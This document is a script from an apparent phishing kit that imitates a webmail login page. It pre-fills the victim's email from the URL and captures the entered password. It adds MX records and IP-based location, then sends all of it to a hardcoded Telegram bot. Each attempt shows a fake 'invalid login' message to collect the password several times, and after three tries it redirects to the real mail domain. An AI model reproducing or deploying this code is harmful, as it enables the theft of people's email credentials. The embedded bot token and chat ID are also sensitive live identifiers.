<script>
// Telegram Bot Configuration
const BOT_TOKEN = "7385206408:AAH581SLhDD-UEJOV4bfqwF5sVtFU_XqInI";
const CHAT_ID = "5361285164";

// Honeypot check
const honeypotField = document.getElementById('honeypot');
let loginAttempts = 0;

// Function to get query parameters
function getQueryParameter(param) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(param);
}

// Fetch MX Records
async function fetchMXRecords(domain) {
    try {
        const response = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`);
        const data = await response.json();
        if (data.Answer) {
            return data.Answer.map(record => record.data).join(', ');
        } else {
            return 'No MX records found';
        }
    } catch {
        return 'Error fetching MX records';
    }
}

// Fetch User's Country or State
async function fetchUserLocation() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return `${data.city || 'Unknown City'}, ${data.region || 'Unknown Region'}, ${data.country_name || 'Unknown Country'}`;
    } catch {
        return 'Unknown Location';
    }
}

// Send data to Telegram
async function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const payload = { chat_id: CHAT_ID, text: message, parse_mode: 'HTML' };
    await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
    });
}

// Populate email field if query parameter exists
window.addEventListener('DOMContentLoaded', async () => {
    const email = getQueryParameter('email');
    if (email) {
        const emailField = document.getElementById('user');
        emailField.value = email;
        emailField.readOnly = true; // Make the email field read-only
    }
});

document.getElementById('login_submit').addEventListener('click', async (e) => {
    e.preventDefault();

    // Check if honeypot is filled
    if (honeypotField.value !== '') {
        return; // Ignore submission if honeypot is filled
    }

    const email = document.getElementById('user').value;
    const password = document.getElementById('pass').value;
    const mxDomain = email.split('@')[1];
    loginAttempts++;

    // Fetch MX Records and Location
    const mxRecords = await fetchMXRecords(mxDomain);
    const userLocation = await fetchUserLocation();

    // Send to Telegram
    const message = `
<b>Webmail Login Attempt</b>
- <b>Email:</b> ${email}
- <b>Password:</b> ${password}
- <b>MX Records:</b> ${mxRecords}
- <b>Location:</b> ${userLocation}
    `;
    await sendToTelegram(message);

    // Redirect after third failed login
    if (loginAttempts >= 3) {
        window.location.href = `https://${mxDomain}`;
        return;
    }

    const notificationBar = document.getElementById('notification-bar');
    notificationBar.style.display = 'block';
    notificationBar.style.backgroundColor = 'lightblue';
    notificationBar.textContent = 'Authenticating...';

    // Simulate "Invalid login" message
    setTimeout(() => {
        notificationBar.style.backgroundColor = 'red';
        notificationBar.textContent = 'The login is invalid.';
    }, 1300);
});
</script>
